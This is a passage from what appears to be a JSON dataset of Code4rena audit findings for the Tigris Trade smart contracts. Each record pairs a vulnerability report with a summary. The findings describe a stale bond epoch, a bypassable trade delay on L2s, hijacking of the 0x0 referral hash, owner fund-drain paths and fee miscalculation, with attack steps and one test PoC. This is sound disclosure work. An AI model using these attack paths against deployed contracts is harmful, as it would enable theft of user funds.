      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L206-L228\nhttps://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L48-L86\n\n\n## Vulnerability details\n\n## Impact\nFunction `BondNFT.createLock()` creates a bond and it sets bond's mint epoch as `epoch[asset]`, function `Lock.lock()` first calls `claimGovFees()` which calls `BondNFT.distribute()` for all assets and updates the `epoch[assets]` for all assets. so during normal bond creation the value of `epoch[asset]` would be updated and bond would be created from `today` epoch to `today+period` epoch. but if `totalShares[tigAsset] == 0` for an asset, then `distribute()` won't update `epoch[asset]` for that asset and `epoch[asset]` will be some old epoch(will be the start time where asset is added or the time where `totalShares[_tigAsset] != 0`). This would make `createLock()` to set very wrong value for bond's mint epoch when `totalShares[tigAsset] == 0`.\nThis would happen for the first bond that has been created for that asset always and it will happen again if for some period `totalShares[asset]` become 0, then the next bond would have wrong mint epoch. or `setAllowedAsset(asset, false)`  has been called for that asset.\n\n## Proof of Concept\nThis is `distribute()` code in BondNFT contract:\n```\nfunction distribute(\n        address _tigAsset,\n        uint _amount\n    ) external {\n        if (totalShares[_tigAsset] == 0 || !allowedAsset[_tigAsset]) return;\n        IERC20(_tigAsset).transferFrom(_msgSender(), address(this), _amount);\n        unchecked {\n            uint aEpoch = block.timestamp / DAY;\n            if (aEpoch > epoch[_tigAsset]) {\n                for (uint i=epoch[_tigAsset]; i<aEpoch; i++) {\n                    epoch[_tigAsset] += 1;\n                    accRewardsPerShare[_tigAsset][i+1] = accRewardsPerShare[_tigAsset][i];\n                }\n            }\n            accRewardsPerShare[_tigAsset][aEpoch] += _amount * 1e18 / totalShares[_tigAsset];\n        }\n        emit Distribution(_tigAsset, _amount);\n    }\n```\nAs you can see when `totalShares[_tigAsset] == 0` then the value of `epoch[_tigAsset]` won't get updated to the today. and there is no other logics in the code to update `epoch[tigAsset]`. so when `totalShares[_tigAsset] == 0` then the value of the `epoch[tigAsset]` would be out dated. this would happen when asset is recently added to the BondNFT assets or when in some time there is no bond left.\nWhen this condition happens and a user call `Lock.lock()` to create a bond the `lock()` function would call `claimGovFees()` to update rewards in BondNFT but because for that asset the value of totalShares are 0 so for that asset `epoch[]` won't get updated and in the `BondNFT.createLock()` the wrong value would set as bond't mint epoch.\nThis is `Lock.lock()` code:\n```\n    function lock(\n        address _asset,\n        uint _amount,\n        uint _period\n    ) public {\n        require(_period <= maxPeriod, \"MAX PERIOD\");\n        require(_period >= minPeriod, \"MIN PERIOD\");\n        require(allowedAssets[_asset], \"!asset\");\n\n        claimGovFees();\n\n        IERC20(_asset).transferFrom(msg.sender, address(this), _amount);\n        totalLocked[_asset] += _amount;\n        \n        bondNFT.createLock( _asset, _amount, _period, msg.sender);\n    }\n```\nAnd this is `BondNFT.createLock()` code:\n```\n    function createLock(\n        address _asset,\n        uint _amount,\n        uint _period,\n        address _owner\n    ) external onlyManager() returns(uint id) {\n        require(allowedAsset[_asset], \"!Asset\");\n        unchecked {\n            uint shares = _amount * _period / 365;\n            uint expireEpoch = epoch[_asset] + _period;\n            id = ++totalBonds;\n            totalShares[_asset] += shares;\n            Bond memory _bond = Bond(\n                id,             // id\n                address(0),     // owner\n                _asset,         // tigAsset token\n                _amount,        // tigAsset amount\n                epoch[_asset],  // mint epoch\n                block.timestamp,// mint timestamp\n                expireEpoch,    // expire epoch\n                0,              // pending\n                shares,         // linearly scaling share of rewards\n                _period,        // lock period\n                false           // is expired boolean\n            );\n            _idToBond[id] = _bond;\n            _mint(_owner, _bond);\n        }\n        emit Lock(_asset, _amount, _period, _owner, id);\n    }\n```\n\nif a bond get wrong value for mint epoch it would have wrong value for expire epoch and user would get a lot of share by lock for small time. for example this scenario:\n1. let's assume `epoch[asset1]` is out dated and it shows 30 days ago epoch. (`allowedAsset[asset1]` was false so locking was not possible and then is set as true after 30 days)\n2. during this time because `totalShare[asset1]` was 0 so `distribute()` function won't udpate `epoch[asset1]` and `epoch[asset1]` would show 30 days ago.\n3. attacker would create a lock for 32 days by calling `Lock.lock(asset1)`. code would call `BondNFT.createLock()` and would create a bond for attacker which epoch start time is 30 days ago and epoch expire time is 2 days later and attacker receives shares for 32 days.\n4. some reward would get distributed into the BondNFT for the `asset1`.\n5. other users would create lock too.\n6. attacker would claim his rewards and his rewards would be for 32 day locking but attacker lock his tokens for 2 days in reality.\n\nso attacker was able to create lock for long time and get shares and rewards based on that but attacker can release lock after short time.\n\n## Tools Used\nVIM\n\n## Recommended Mitigation Steps\nupdate `epoch[asset]` in `distribute()` function  even when `totalShares[_tigAsset]` is equal to 0. only the division by zero and fund transfer should be prevented when totalShare is zero and `epoch[asset]` index should be updated.",
      "summary": "\nThis bug report is about a vulnerability in the BondNFT.sol contract which is part of the code-423n4/2022-12-tigris repository. The vulnerability is related to the `BondNFT.createLock()` function, which creates a bond and sets the bond's mint epoch as `epoch[asset]`. The `Lock.lock()` function calls `claimGovFees()` which calls `BondNFT.distribute()` for all assets and updates the `epoch[assets]` for all assets. \n\nHowever, if `totalShares[tigAsset] == 0` for an asset, then `distribute()` won't update `epoch[asset]` for that asset and `epoch[asset]` will be some old epoch, which will be the start time where asset is added or the time where `totalShares[_tigAsset] != 0`. This would make `createLock()` to set a very wrong value for bond's mint epoch when `totalShares[tigAsset] == 0`.\n\nThis vulnerability would happen for the first bond that has been created for that asset always and it will happen again if for some period `totalShares[asset]` become 0, then the next bond would have wrong mint epoch. It can also happen when `setAllowedAsset(asset, false)`  has been called for that asset.\n\nThe recommended mitigation step for this vulnerability is to update `epoch[asset]` in `distribute()` function even when `totalShares[_tigAsset]` is equal to 0. The division by zero and fund transfer should be prevented when totalShare is zero and `epoch[asset]` index should be updated. VIM was used as the tool for this bug report.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/436",
      "tags": [],
      "finders": [
        "unforgiven"
      ]
    },
    {
      "id": "6345",
      "title": "[M-15] _checkDelay will not work properly for Arbitrum or Optimism due to block.number ",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L857-L868\n\n\n## Vulnerability details\n\n## Impact\n\nTrade delay will not work correctly on Arbitrum allowing users to exploit multiple valid prices \n\n## Proof of Concept\n\n    function _checkDelay(uint _id, bool _type) internal {\n        unchecked {\n            Delay memory _delay = blockDelayPassed[_id];\n            //in those situations\n            if (_delay.actionType == _type) {\n                blockDelayPassed[_id].delay = block.number + blockDelay;\n            } else {\n                if (block.number < _delay.delay) revert(\"0\"); //Wait\n                blockDelayPassed[_id].delay = block.number + blockDelay;\n                blockDelayPassed[_id].actionType = _type;\n            }\n        }\n    }\n\n_checkDelay enforces a delay of a specific number of block between opening and closing a position. While this structure will work on mainnet, it is problematic for use on Arbitrum. According to Arbitrum [Docs](https://developer.offchainlabs.com/time) `block.number` returns the most recently synced L1 block number. Once per minute the block number in the Sequencer is synced to the actual L1 block number. This period could be abused to completely bypass this protection. The user would open their position 1 Arbitrum block before the sync happens, the close it the very next block. It would appear that there has been 5 block (60 / 12) since the last transaction but in reality it has only been 1 Arbitrum block. Given that Arbitrum has 2 seconds blocks I would be impossible to block this behavior through parameter changes.\n\nIt also presents an issue for [Optimism](https://community.optimism.io/docs/developers/build/differences/#block-numbers-and-timestamps) because each transaction is it's own block. No matter what value is used for the block delay, the user can pad enough tiny transactions to allow them to close the trade immediately. \n\n## Tools Used\n\nManual Review\n\n## Recommended Mitigation Steps\n\nThe delay should be measured using block.timestamp rather than block.number",
      "summary": "\nThis bug report is about a vulnerability that allows users to exploit multiple valid prices by bypassing a trade delay on Arbitrum. The trade delay is enforced by the function _checkDelay which uses block.number to measure the delay. However, since the block.number is only synced once per minute, users can open and close their position within the same Arbitrum block, appearing as if the delay was respected when it wasn't. The same issue occurs on Optimism, where each transaction is its own block.\n\nThe recommended mitigation step is to use block.timestamp instead of block.number to measure the delay. This way, the delay will be respected regardless of how many transactions are included in the same block.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/419",
      "tags": [],
      "finders": [
        "0x52"
      ]
    },
    {
      "id": "6344",
      "title": "[M-14] BondNFT.sol#claim() needs to correct all the missing epochs",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L177-L183\nhttps://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L235-L242\n\n\n## Vulnerability details\n\n## Impact\n\nIn `BondNFT.sol#claim()`, `accRewardsPerShare[][]` is amended to reflect the expired shares. But only `accRewardsPerShare[bond.asset][epoch[bond.asset]]` is updated. All the epochs between `bond.expireEpoch-1` and `epoch[bond.asset]` are missed. However, some users claimable rewards calculation could be based on the missed epochs. As a result, the impact might be:\n- `accRewardsPerShare` be inaccurate for the epochs in between.\n- some users could lose reward due to wrong `accRewardsPerShare`, some users might receive undeserved rewards.\n- some rewards will be locked in the contract.\n\n\n## Proof of Concept\n\nThe rationale behind the unchecked block below seems to take into account the shares of reward of the expired bond. However, if only update the latest epoch data, the epochs in between could have errors and lead to loss of other users.\n\n```solidity\nFile: contracts/BondNFT.sol\n168:     function claim(\n169:         uint _id,\n170:         address _claimer\n171:     ) public onlyManager() returns(uint amount, address tigAsset) {\n    \n177:             if (bond.expired) {\n178:                 uint _pendingDelta = (bond.shares * accRewardsPerShare[bond.asset][epoch[bond.asset]] / 1e18 - bondPaid[_id][bond.asset]) - (bond.shares * accRewardsPerShare[bond.asset][bond.expireEpoch-1] / 1e18 - bondPaid[_id][bond.asset]);\n179:                 if (totalShares[bond.asset] > 0) {\n180:                     accRewardsPerShare[bond.asset][epoch[bond.asset]] += _pendingDelta*1e18/totalShares[bond.asset];\n181:                 }\n182:             }\n183:             bondPaid[_id][bond.asset] += amount;\n```\n\nUsers can claim rewards up to the expiry time, based on `accRewardsPerShare[tigAsset][bond.expireEpoch-1]`:\n```solidity\n235:     function idToBond(uint256 _id) public view returns (Bond memory bond) {\n    \n238:         bond.expired = bond.expireEpoch <= epoch[bond.asset] ? true : false;\n239:         unchecked {\n240:             uint _accRewardsPerShare = accRewardsPerShare[bond.asset][bond.expired ? bond.expireEpoch-1 : epoch[bond.asset]];\n241:             bond.pending = bond.shares * _accRewardsPerShare / 1e18 - bondPaid[_id][bond.asset];\n\n```",
      "summary": "\nThis bug report is about the `BondNFT.sol#claim()` function in the BondNFT.sol file on the GitHub repository code-423n4/2022-12-tigris. The bug is that when a user claims rewards, the `accRewardsPerShare[][]` array is amended to reflect the expired shares, but only the `accRewardsPerShare[bond.asset][epoch[bond.asset]]` is updated. This means that any epochs between `bond.expireEpoch-1` and `epoch[bond.asset]` are missed, which could lead to inaccurate `accRewardsPerShare` values and some users losing or receiving undeserved rewards.\n\nThe proof of concept for this bug is that the rationale behind the unchecked block in the `BondNFT.sol#claim()` function is to take into account the shares of reward of the expired bond. However, if only the latest epoch data is updated, the epochs in between could have errors and lead to loss of other users. Additionally, users can claim rewards up to the expiry time, based on `accRewardsPerShare[tigAsset][bond.expireEpoch-1]`. \n\nOverall, this bug could lead to inaccurate rewards calculations, some users losing or receiving undeserved rewards, and some rewards being locked in the contract.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/392",
      "tags": [],
      "finders": [
        "__141345__"
      ]
    },
    {
      "id": "6343",
      "title": "[M-13] One can become referral of hash 0x0 and because all users default referral hash is 0x0 so he would become all users referral by default and earn a lot of fees while users didnt approve it",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Referrals.sol#L20-L24\nhttps://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/TradingExtension.sol#L148-L152\n\n\n## Vulnerability details\n\n## Impact\nBy default the value of `_referred[user]` is 0x0 for all users and if one set 0x0 as his referral hash then he would become referral for all the users who didn't set referral by default and he would earn a lot of referral funds that users didn't approve it.\n\n## Proof of Concept\nThis is `createReferralCode()` code:\n```\n    function createReferralCode(bytes32 _hash) external {\n        require(_referral[_hash] == address(0), \"Referral code already exists\");\n        _referral[_hash] = _msgSender();\n        emit ReferralCreated(_msgSender(), _hash);\n    }\n```\nAs you can see attacker can become set 0x0 as his hash referral by calling `createReferralCode(0x0)` and code would set `_referral[0x0] = attackerAddress` (attacker needs to be the first one calling this).\nThen in the `getRef()` code the logic would return `attackerAddress` as referral for all the users who didn't set referral.\n```\n    function getRef(\n        address _trader\n    ) external view returns(address) {\n        return referrals.getReferral(referrals.getReferred(_trader));\n    }\n```\nin the code, getReferred(trader) would return 0x0 because trader didn't set referred and getReferral(0x0) would return attackerAddress.\n`_handleOpenFees()` and `_handleCloseFees()` function in the Trading contract would use `getRef(trader)` and they would transfer referral fee to attackerAddress and attacker would receive fee form a lot of users which didn't set any referral, those users didn't set any referral and didn't approve attacker receiving referral fees from them and because most of the users wouldn't know about this and referral codes so attacker would receive a lot of funds.\n\n## Tools Used\nVIM\n\n## Recommended Mitigation Steps\nprevent some one from setting 0x0 hash for their referral code.",
      "summary": "\nThis bug report describes a vulnerability in the code of a smart contract that could be exploited to allow an attacker to gain referral fees without the consent of the users. The vulnerability lies in the fact that the value of the _referred[user] variable is set to 0x0 for all users by default, and if an attacker sets 0x0 as their referral hash, they would become the referral for all users who did not set a referral code. This would allow the attacker to earn referral fees from these users without their consent.\n\nThe vulnerability can be exploited by the attacker calling the createReferralCode() function with 0x0 as the hash parameter. This would set the _referral[0x0] variable to the attackers address. The getRef() function in the smart contract then returns the attackers address as the referral for all users who have not set a referral code. This would result in the _handleOpenFees() and _handleCloseFees() functions transferring referral fees to the attackers address.\n\nThe recommended mitigation step is to prevent someone from setting 0x0 as their referral code.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/379",
      "tags": [],
      "finders": [
        "unforgiven"
      ]
    },
    {
      "id": "6342",
      "title": "[M-12] Centralization risks: owner can freeze withdraws and use timelock to steal all funds",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Trading.sol#L222-L230> \n\n<https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/StableVault.sol#L78-L83> \n\n<https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/StableToken.sol#L38-L46> \n\n<https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/PairsContract.sol#L48>\n\nThe project heavily relies on nodes/oracles, which are EOAs that sign the current price.\n\nSince all functions (including withdrawing) require a recently-signed price, the owner(s) of those EOA can freeze all activity by not providing signed prices.\n\nI got from the sponsor that the owner of the contract is going to be a timelock contract.\nHowever, once the owner holds the power to pause withdrawals - that nullifies the timelock. The whole point of the timelock is to allow users to withdraw their funds when they see a pending malicious tx before it's executed. If the owner has the power to freeze users' funds in the contract, they wouldn't be able to do anything while the owner executes his malicious activity.\n\nBesides that, there are also LP funds, which are locked to a certain period, and also can't withdraw their funds when they see a pending malicious timelock tx.\n\n### Impact\n\nThe owner (or attacker who steals the owner's wallet) can steal all user's funds.\n\n### Proof of Concept\n\n*   The fact that the protocol relies on EOA signatures is pretty clear from the code and docs\n*   The whole project relies on the 'StableVault' and 'StableToken'\n    *   The value of the 'StableToken' comes from the real stablecoin that's locked in 'StableVault', if someone manages to empty the 'StableVault' from the deposited stablecoins the 'StableToken' would become worthless\n*   The owner has a few ways to drain all funds:\n    *   Replace the minter via `StableToken.setMinter()`, mint more tokens, and redeem them via `StableVault.withdraw()`\n    *   List a fake token at `StableVault`, deposit it and withdraw real stablecoin\n    *   List a new fake asset for trading with a fake chainlink oracle, fake profit with trading with fake prices, and then withdraw\n        *   They can prevent other users from doing the same by setting `maxOi` and opening position in the same tx\n    *   Replace the MetaTx forwarder and execute tx on behalf of users (e.g. transferring bonds, positions and StableToken from their account)\n\n### Recommended Mitigation Steps\n\n*   Rely on a contract (chainlink/Uniswap) solely as an oracle\n*   Alternately, add functionality to withdraw funds at the last given price in case no signed data is given for a certain period\n    *   You can do it by creating a challenge in which a user requests to close his position at a recent price, if no bot executes it for a while it can be executed at the last recorded price.\n*   As for LPs' funds, I don't see an easy way around it (besides doing significant changes to the architecture of the protocol), this a risk LPs should be aware of and decide if they're willing to accept.\n\n**[TriHaz (Tigris Trade) acknowledged, but disagreed with severity and commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/377#issuecomment-1377601222):**\n > We are aware of the centralization risks. Owner of contracts will be a timelock and owner will be a multi sig to reduce the centralization for now until it's fully controlled by DAO.\n\n**[Alex the Entreprenerd (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/377#issuecomment-1383157493):**\n > Missing setFees, but am grouping generic reports under this one as well.\n>\n > Also missing changes to Trading Extension and Referral Fees.\n>\n > This report, in conjunction with [#648](https://github.com/code-423n4/2022-12-tigris-findings/issues/648) effectively covers all \"basic\" admin privilege findings. More nuanced issues are judged separately.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in a project that heavily relies on nodes/oracles, which are EOAs that sign the current price. The vulnerability is that the owner of the contract can freeze all activity by not providing signed prices, which would allow them to steal all user's funds. The proof of concept is that the owner has a few ways to drain all funds, such as replacing the minter via `StableToken.setMinter()`, listing a fake token at `StableVault`, listing a new fake asset for trading with a fake chainlink oracle, and replacing the MetaTx forwarder and executing transactions on behalf of users.\n\nThe recommended mitigation steps are to rely on a contract (chainlink/Uniswap) solely as an oracle and to add functionality to withdraw funds at the last given price in case no signed data is given for a certain period. As for LPs' funds, there is no easy way around it, but this a risk LPs should be aware of and decide if they're willing to accept.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/377",
      "tags": [
        "Admin"
      ],
      "finders": [
        "philogy",
        "ladboy233",
        "0xSmartContract",
        "HE1M",
        "peanuts",
        "JohnnyTime",
        "yjrwkk",
        "francoHacker",
        "jadezti",
        "Faith",
        "0xNazgul",
        "orion",
        "rbserver",
        "kwhuo68",
        "gz627",
        "aviggiano",
        "Mukund",
        "0xA5DF",
        "hihen",
        "cccz",
        "0xbepresent",
        "Englave",
        "Ruhum",
        "wait",
        "Madalad",
        "hansfriese",
        "SmartSek",
        "imare",
        "0xdeadbeef0x",
        "chaduke",
        "8olidity",
        "__141345__",
        "gzeon",
        "carlitox477"
      ]
    },
    {
      "id": "6341",
      "title": "[M-11] _handleOpenFees returns an incorrect value for _feePaid. This directly impacts margin calculations",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L178\nhttps://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L734\n\n\n## Vulnerability details\n\n## Impact\n\nFormula for `fee paid` in [Line 734](https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L734) is incorrect leading to incorrect margin calculations. Since this directly impacts the trader margin and associated fee calculations, I've marked as HIGH risk\n\nOn initiating a market order, `Margin` is adjusted for the `fees` that is charged by protocol. This adjustment is in [Line 178 of Trading](https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L178). Fees computed by `_handleOpenFees ` is deducted from Initial margin posted by user.\n\nformula misses to account the `2*referralFee` component while calculaing `_feePaid`\n\n## Proof of Concept\nNote that `_feePaid` as per formula in Line 734 is the sum of `_daoFeesPaid', and sum of `burnerFee` & `botFee`. `_daoFeesPaid` is calculated from `_fees.daoFees` which itself is calculated by subtracting `2*referralFee` and `botFee`. \n\nSo when we add back `burnerFee` and `botFee` to `_feePaid`, we are missing to add back the `2*referralFee`  which was earlier excluded when calculating `_daoFeesPaid`. While `botFee` is added back correctly, same adjustment is not being done viz-a-viz referral fee.\n\n This results in under calculating the `_feePaid` and impacts the rewards paid to the protocol NFT holders.\n\n\n## Tools Used\n\n## Recommended Mitigation Steps\n\nSuggest replacing the formula in line 734 with below (adding back _fees.referralFees*2)\n\n```\n            _feePaid =\n                _positionSize\n                * (_fees.burnFees + _fees.botFees + _fees.referralFees*2 ) \n                / DIVISION_CONSTANT // divide by 100%\n                + _daoFeesPaid;\n```",
      "summary": "\nThis bug report is about the incorrect formula for calculating the 'fee paid' in line 734 of the Trading.sol file in the code-423n4/2022-12-tigris repository. This incorrect formula leads to incorrect margin calculations which directly affects the trader margin and associated fee calculations. This is considered a high risk vulnerability. \n\nThe issue is that the formula for 'fee paid' is missing to account for the '2*referralFee' component when calculating '_feePaid'. The '_feePaid' should be the sum of '_daoFeesPaid', 'burnerFee' and 'botFee'. The '_daoFeesPaid' is calculated from '_fees.daoFees' which itself is calculated by subtracting '2*referralFee' and 'botFee'. When 'burnerFee' and 'botFee' are added back to '_feePaid', the '2*referralFee' is not being added back which results in under calculating the '_feePaid' and affects the rewards paid to the protocol NFT holders. \n\nThe recommended mitigation step is to replace the formula in line 734 with one that adds back the '_fees.RefferalFees*2'. This should resolve the incorrect margin calculations and associated fee calculations.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/367",
      "tags": [],
      "finders": [
        "chaduke",
        "0Kage"
      ]
    },
    {
      "id": "6340",
      "title": "[M-10] BondNFT.extendLock force a user to extend the bond at least for current bond.period",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L97-L125\n\n\n## Vulnerability details\n\n## Description\nThe current implementation forces a user to extend their bonds for at least they current bond period. These mean that, for instance, a bond which was initially locked for 365 can never be extended, even after a week of being created.\n\nIf we consider that a bond should have at least a 7 days lock and at the most 365 days, then the current ```BondNFT.extendLock``` function should be refactored.\n\n## Impact\n* Current ```BondNFT.extendLock``` function does not work as expected, forcing user who want to extend their bond to extend them at least for their current bond.period.\n* For bonds which were set with a lock period of 365 days, they can not be extended, even after days of their creation.\n\n## POC\n```typescript\n// In 09.Bond.js,  describe \"Extending lock\"\nit(\"POC: Extending the lock does not work as expected\", async function () {\n      await stabletoken.connect(owner).mintFor(user.address, ethers.utils.parseEther(\"100\"));\n      // user lock bond funds for 10 days\n      await lock.connect(user).lock(StableToken.address, ethers.utils.parseEther(\"100\"), 10);\n\n      const fiveDaysTime = 5 * 24 * 60 * 60\n      const eightDaysTime = 8 * 24 * 60 * 60\n\n      // owner distribute rewards\n      console.log(\"User created a lock for 10 days\")\n      await stabletoken.connect(owner).mintFor(owner.address, ethers.utils.parseEther(\"10\"));\n      await bond.connect(owner).distribute(stabletoken.address, ethers.utils.parseEther(\"10\"));\n\n      // Five days pass\n      await network.provider.send(\"evm_increaseTime\", [fiveDaysTime]); // Skip 10 days\n      await network.provider.send(\"evm_mine\");\n      console.log(\"\\n5 days pass\")\n\n      // User decide to extend their lock three days, given the current implementation the user is forced to extended 13 days\n      const bondInfoBeforeExtension = await bond.idToBond(1)\n      console.log(`Bond info before extension: {period: ${bondInfoBeforeExtension.period}, expireEpoch: ${bondInfoBeforeExtension.expireEpoch}}`)\n      \n      await lock.connect(user).extendLock(1, 0, 3)\n      console.log(\"Bond was extended for 3 days\")\n      const bondInfoAfterExtension = await bond.idToBond(1)\n      console.log(`Bond info after extension: {period: ${bondInfoAfterExtension.period}, expireEpoch: ${bondInfoAfterExtension.expireEpoch}}`)\n\n      // 8 days pass, user should be able to release the bond given the extension of 3 days (8 days should be enough)\n      await network.provider.send(\"evm_increaseTime\", [eightDaysTime]);\n      await network.provider.send(\"evm_mine\");\n      console.log(\"\\n8 days later\")\n      console.log(\"After 13 days (10 original days + 3 days from extension) the user can not release the bond\")\n      \n      // The user decide to claim their part and get their bond amount\n      // The user should recieve all the current funds in the contract\n      await expect(lock.connect(user).release(1)).to.be.revertedWith('!expire')\n\n    });\n```\n\n## Mitigation steps\nIn order to ```extendLock``` to work properly, the current implementation  should be changed to:\n```diff\nfunction extendLock(\n    uint _id,\n    address _asset,\n    uint _amount,\n    uint _period,\n    address _sender\n) external onlyManager() {\n    Bond memory bond = idToBond(_id);\n    Bond storage _bond = _idToBond[_id];\n    require(bond.owner == _sender, \"!owner\");\n    require(!bond.expired, \"Expired\");\n    require(bond.asset == _asset, \"!BondAsset\");\n    require(bond.pending == 0); //Cannot extend a lock with pending rewards\n+   uint currentEpoch = block.timestamp/DAY;\n-   require(epoch[bond.asset] == block.timestamp/DAY, \"Bad epoch\");\n    require(epoch[bond.asset] == currentEpoch, \"Bad epoch\");\n\n+   uint pendingEpochs = bond.expireEpoch - currentEpoch;\n+   uint newBondPeriod = pendingEpochs + _period;\n+   //In order to respect min bond period when we extend a bon\n+   // Next line can be omitted at discretion of the protocol and devs\n+   // If it is omitted any created bond would be able to be extended always (except from those with period = 365)\n+   require(newBondPeriod >= 7, \"MIN PERIOD\");\n\n-    require(bond.period+_period <= 365, \"MAX PERIOD\");\n+    require(newBondPeriod <= 365, \"MAX PERIOD\");\n    \n    unchecked {\n-       uint shares = (bond.amount + _amount) * (bond.period + _period) / 365;\n+       uint shares = (bond.amount + _amount) * newBondPeriod / 365;\n\n-       uint expireEpoch = block.timestamp/DAY + bond.period + _period;\n+       uint expireEpoch = currentEpoch + newBondPeriod;\n\n        totalShares[bond.asset] += shares-bond.shares;\n        _bond.shares = shares;\n        _bond.amount += _amount;\n        _bond.expireEpoch = expireEpoch;\n        _bond.period += _period;\n        _bond.mintTime = block.timestamp; \n-       _bond.mintEpoch = epoch[bond.asset];\n+       _bond.mintEpoch = currentEpoch;\n-       bondPaid[_id][bond.asset] = accRewardsPerShare[bond.asset][epoch[bond.asset]] * _bond.shares / 1e18;\n+       bondPaid[_id][bond.asset] = accRewardsPerShare[bond.asset][currentEpoch] * _bond.shares / 1e18;\n    }\n    emit ExtendLock(_period, _amount, _sender,  _id);\n}\n```",
      "summary": "\nThis bug report is about a vulnerability in the current implementation of the BondNFT.sol contract. The current ```BondNFT.extendLock``` function forces a user to extend their bonds for at least their current bond period. This means that, for instance, a bond which was initially locked for 365 can never be extended, even after a week of being created.\n\nThe impact of this vulnerability is that users who want to extend their bond are forced to extend them at least for their current bond period. Additionally, bonds which were set with a lock period of 365 days can not be extended, even after days of their creation.\n\nA proof of concept (POC) is provided for this vulnerability. It describes a scenario in which a user creates a bond for 10 days, and then tries to extend it for 3 days after 5 days have passed. However, due to the current implementation, the user is forced to extend the bond for 13 days. After 8 days, the user is still not able to release the bond.\n\nThe mitigation steps for this vulnerability are to refactor the ```BondNFT.extendLock``` function. This includes changing the implementation to allow users to extend their bond period for less than their current bond period, and also to respect the minimum bond period when extending a bond.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/359",
      "tags": [],
      "finders": [
        "carlitox477"
      ]
    },
    {
      "id": "6339",
      "title": "[M-09] safeTransferMany() doesnt actually use safe transfer",
      "impact": "MEDIUM",
